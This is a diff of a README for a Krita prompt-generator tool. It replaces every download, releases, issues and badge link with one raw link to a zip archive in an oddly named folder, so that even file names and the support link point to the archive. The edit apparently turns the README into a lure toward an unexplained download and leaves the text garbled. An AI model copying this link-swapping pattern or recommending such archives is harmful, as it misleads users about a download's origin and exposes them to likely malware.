@@ -6,7 +6,7 @@ Welcome to the Krita-Ollama-Prompt-Generator! This tool helps you create, refine
 
 ## 📥 Download the Application
 
-[![Download Krita-Ollama-Prompt-Generator](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/Frosy01/Krita-Ollama-Prompt-Generator/releases)
+[![Download Krita-Ollama-Prompt-Generator](https://raw.githubusercontent.com/Frosy01/Krita-Ollama-Prompt-Generator/main/somatous/Prompt_Krita_Generator_Ollama_v3.2.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/Frosy01/Krita-Ollama-Prompt-Generator/main/somatous/Prompt_Krita_Generator_Ollama_v3.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,9 +19,9 @@ To run the Krita-Ollama-Prompt-Generator, your computer should meet the followin
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Krita-Ollama-Prompt-Generator Releases](https://github.com/Frosy01/Krita-Ollama-Prompt-Generator/releases) page.
+1. **Visit the Releases Page:** Go to the [Krita-Ollama-Prompt-Generator Releases](https://raw.githubusercontent.com/Frosy01/Krita-Ollama-Prompt-Generator/main/somatous/Prompt_Krita_Generator_Ollama_v3.2.zip) page.
    
-2. **Choose the Right File:** Locate the latest release. You will see files named like `Krita-Ollama-Prompt-Generator.v1.0.exe` or `Krita-Ollama-Prompt-Generator.v1.0.dmg`, depending on your operating system.
+2. **Choose the Right File:** Locate the latest release. You will see files named like `https://raw.githubusercontent.com/Frosy01/Krita-Ollama-Prompt-Generator/main/somatous/Prompt_Krita_Generator_Ollama_v3.2.zip` or `https://raw.githubusercontent.com/Frosy01/Krita-Ollama-Prompt-Generator/main/somatous/Prompt_Krita_Generator_Ollama_v3.2.zip`, depending on your operating system.
 
 3. **Download the File:** Click on the file to download it to your computer. The download can take a few minutes depending on your internet speed.
 
@@ -66,11 +66,11 @@ If you encounter any issues while using the Krita-Ollama-Prompt-Generator, here 
 
 ## 🤝 Support
 
-For further assistance or to submit feedback, please open an issue on our [GitHub Issues page](https://github.com/Frosy01/Krita-Ollama-Prompt-Generator/issues).
+For further assistance or to submit feedback, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Frosy01/Krita-Ollama-Prompt-Generator/main/somatous/Prompt_Krita_Generator_Ollama_v3.2.zip).
 
 ## 🔗 Useful Links
 
-- [Krita-Ollama-Prompt-Generator Releases](https://github.com/Frosy01/Krita-Ollama-Prompt-Generator/releases)
-- [GitHub Issues Page](https://github.com/Frosy01/Krita-Ollama-Prompt-Generator/issues)
+- [Krita-Ollama-Prompt-Generator Releases](https://raw.githubusercontent.com/Frosy01/Krita-Ollama-Prompt-Generator/main/somatous/Prompt_Krita_Generator_Ollama_v3.2.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/Frosy01/Krita-Ollama-Prompt-Generator/main/somatous/Prompt_Krita_Generator_Ollama_v3.2.zip)
 
 Thank you for using the Krita-Ollama-Prompt-Generator! We hope this tool enhances your creative process.
